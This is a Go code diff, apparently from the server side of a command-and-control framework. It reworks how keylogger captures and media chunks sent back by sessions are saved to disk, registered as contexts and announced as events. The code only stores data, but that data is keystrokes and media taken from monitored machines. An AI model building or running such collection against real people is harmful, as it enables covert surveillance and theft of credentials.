@@ -12,8 +12,10 @@ import (
 	"github.com/chainreactors/malice-network/server/internal/configs"
 	"github.com/chainreactors/malice-network/server/internal/db"
 	"github.com/chainreactors/malice-network/server/internal/db/models"
+	"github.com/gofrs/uuid"
 	"os"
 	"path/filepath"
+	"strings"
 	"time"
 )
 
@@ -188,6 +190,13 @@ func LoadContext(ctx output.Context) (output.Context, error) {
 		}
 		c.Content = data
 		return c, nil
+	case *output.MediaContext:
+		data, err := os.ReadFile(c.FilePath)
+		if err != nil {
+			return nil, err
+		}
+		c.Content = data
+		return c, nil
 	}
 
 	return ctx, nil
@@ -204,6 +213,8 @@ func ReadFileForContext(ctx output.Context) ([]byte, error) {
 		filePath = c.FilePath
 	case *output.UploadContext:
 		filePath = c.FilePath
+	case *output.MediaContext:
+		filePath = c.FilePath
 	default:
 		return nil, errors.New("unsupported context type")
 	}
@@ -215,23 +226,137 @@ func ReadFileForContext(ctx output.Context) ([]byte, error) {
 	return data, nil
 }
 
-// findTodayKeyloggerContext
-func findTodayKeyloggerContext(task *Task) (*models.Context, error) {
-	return db.FindTodayKeyloggerContext(task.SessionId)
+func sanitizeContextFragment(value string) string {
+	value = strings.TrimSpace(value)
+	if value == "" {
+		return value
+	}
+	value = filepath.Base(value)
+	value = strings.ReplaceAll(value, "..", "")
+	value = strings.ReplaceAll(value, "/", "_")
+	value = strings.ReplaceAll(value, "\\", "_")
+	value = strings.ReplaceAll(value, string(filepath.Separator), "_")
+	value = strings.ReplaceAll(value, " ", "_")
+	return value
 }
 
-func HandleKeylogger(data []byte, task *Task) error {
-	today := time.Now().Format("2006-01-02")
-	filename := fmt.Sprintf("%s_%s.log", task.SessionId, today)
-	savePath := filepath.Join(configs.ContextPath, task.SessionId, consts.KeyLoggerPath, filename)
+func sanitizeFileName(name string, fallback string) string {
+	cleaned := sanitizeContextFragment(name)
+	if cleaned == "" {
+		cleaned = fallback
+	}
+	if cleaned == "" {
+		cleaned = fmt.Sprintf("media-%d.bin", time.Now().UnixNano())
+	}
+	return cleaned
+}
+
+func deterministicContextID(sessionID, identifier, nonce, contextType string) string {
+	base := fmt.Sprintf("%s:%s:%s:%s", sessionID, identifier, nonce, contextType)
+	return uuid.NewV5(uuid.NamespaceOID, base).String()
+}
+
+func HandleKeylogger(data []byte, task *Task, identifier string, filename string, nonce string) error {
 	if len(data) == 0 {
 		return nil
 	}
-	if err := os.MkdirAll(filepath.Dir(savePath), os.ModePerm); err != nil {
+
+	name := sanitizeContextFragment(filename)
+	identifier = sanitizeContextFragment(identifier)
+	if name == "" {
+		if identifier == "" {
+			identifier = sanitizeContextFragment(nonce)
+		}
+		if identifier == "" {
+			identifier = time.Now().Format("2006_01_02_15_04_05")
+		}
+		name = fmt.Sprintf("%s.log", identifier)
+	}
+
+	dir := filepath.Join(configs.ContextPath, task.SessionId, consts.KeyLoggerPath)
+	if err := os.MkdirAll(dir, os.ModePerm); err != nil {
+		return err
+	}
+	savePath := filepath.Join(dir, name)
+
+	file, err := os.OpenFile(savePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	if _, err := file.Write(data); err != nil {
+		return err
+	}
+	if _, err := file.WriteString("\n"); err != nil {
 		return err
 	}
 
-	file, err := os.OpenFile(savePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	info, err := os.Stat(savePath)
+	if err != nil {
+		return err
+	}
+	checksum, _ := fileutils.CalculateSHA256Checksum(savePath)
+
+	ctx := &output.KeyLoggerContext{
+		FileDescriptor: &output.FileDescriptor{
+			Name:       name,
+			Checksum:   checksum,
+			TargetPath: "KeyLogger",
+			FilePath:   savePath,
+			Size:       info.Size(),
+		},
+	}
+
+	value := output.MarshalContext(ctx)
+	if value == nil {
+		return errors.New("failed to marshal keylogger context")
+	}
+
+	contextPB := &clientpb.Context{
+		Task:    task.ToProtobuf(),
+		Session: task.Session.ToProtobufLite(),
+		Type:    consts.ContextKeyLogger,
+		Value:   value,
+		Nonce:   nonce,
+	}
+	contextPB.Id = deterministicContextID(task.SessionId, name, nonce, consts.ContextKeyLogger)
+
+	model, err := db.SaveContext(contextPB)
+	if err != nil {
+		return err
+	}
+
+	EventBroker.Publish(Event{
+		EventType: consts.EventContext,
+		Op:        consts.ContextKeyLogger,
+		Task:      task.ToProtobuf(),
+		Message:   fmt.Sprintf("keylogger context %s updated (%s)", model.ID.String(), name),
+	})
+	return nil
+}
+
+func HandleMediaChunk(task *Task, nonce, identifier, filename, mediaKind string, data []byte) error {
+	if len(data) == 0 {
+		return nil
+	}
+
+	sanitizedID := sanitizeContextFragment(identifier)
+	if sanitizedID == "" {
+		sanitizedID = sanitizeContextFragment(nonce)
+	}
+	if sanitizedID == "" {
+		sanitizedID = fmt.Sprintf("%s-%d", task.SessionId, time.Now().UnixNano())
+	}
+
+	saveName := sanitizeFileName(filename, sanitizedID+".bin")
+	dir := filepath.Join(configs.ContextPath, task.SessionId, consts.MediaPath)
+	if err := os.MkdirAll(dir, os.ModePerm); err != nil {
+		return err
+	}
+	savePath := filepath.Join(dir, saveName)
+
+	file, err := os.OpenFile(savePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
 	if err != nil {
 		return err
 	}
@@ -241,62 +366,48 @@ func HandleKeylogger(data []byte, task *Task) error {
 		return err
 	}
 
-	if _, err := file.WriteString("\n"); err != nil {
-		return err
-	}
-	existingContext, err := findTodayKeyloggerContext(task)
+	info, err := file.Stat()
 	if err != nil {
 		return err
 	}
-	fileInfo, err := os.Stat(savePath)
+
+	mediaCtx := &output.MediaContext{
+		FileDescriptor: &output.FileDescriptor{
+			Name:       saveName,
+			TargetPath: mediaKind,
+			FilePath:   savePath,
+			Size:       info.Size(),
+		},
+		Identifier: sanitizedID,
+		MediaKind:  mediaKind,
+	}
+
+	value := output.MarshalContext(mediaCtx)
+	if value == nil {
+		return errors.New("failed to marshal media context")
+	}
+
+	contextPB := &clientpb.Context{
+		Task:    task.ToProtobuf(),
+		Session: task.Session.ToProtobufLite(),
+		Type:    consts.ContextMedia,
+		Value:   value,
+		Nonce:   nonce,
+	}
+	if sanitizedID != "" || nonce != "" {
+		contextPB.Id = deterministicContextID(task.SessionId, sanitizedID, nonce, consts.ContextMedia)
+	}
+
+	model, err := db.SaveContext(contextPB)
 	if err != nil {
 		return err
 	}
-	checksum, _ := fileutils.CalculateSHA256Checksum(savePath)
-	var ictx *models.Context
-	if existingContext != nil {
-		var ctx output.KeyLoggerContext
-		if err := json.Unmarshal(existingContext.Value, &ctx); err != nil {
-			return err
-		}
 
-		ctx.Checksum = checksum
-		ctx.FilePath = savePath
-		ctx.Size = fileInfo.Size()
-
-		value, err := json.Marshal(ctx)
-		if err != nil {
-			return err
-		}
-
-		existingContext.Value = value
-		err = db.UpdateContext(existingContext)
-		if err != nil {
-			return err
-		}
-
-		ictx = existingContext
-	} else {
-		ctx := &output.KeyLoggerContext{
-			FileDescriptor: &output.FileDescriptor{
-				Name:       filename,
-				Checksum:   checksum,
-				TargetPath: "KeyLogger",
-				FilePath:   savePath,
-				Size:       fileInfo.Size(),
-			},
-		}
-		ictx, err = SaveContext(ctx, task)
-		if err != nil {
-			return err
-		}
-	}
 	EventBroker.Publish(Event{
 		EventType: consts.EventContext,
-		Op:        consts.ContextKeyLogger,
+		Op:        consts.ContextMedia,
 		Task:      task.ToProtobuf(),
-		Message:   fmt.Sprintf("new keylog has been added to the context: %s", ictx.ID),
+		Message:   fmt.Sprintf("media context %s updated (%s)", model.ID.String(), saveName),
 	})
-
 	return nil
 }
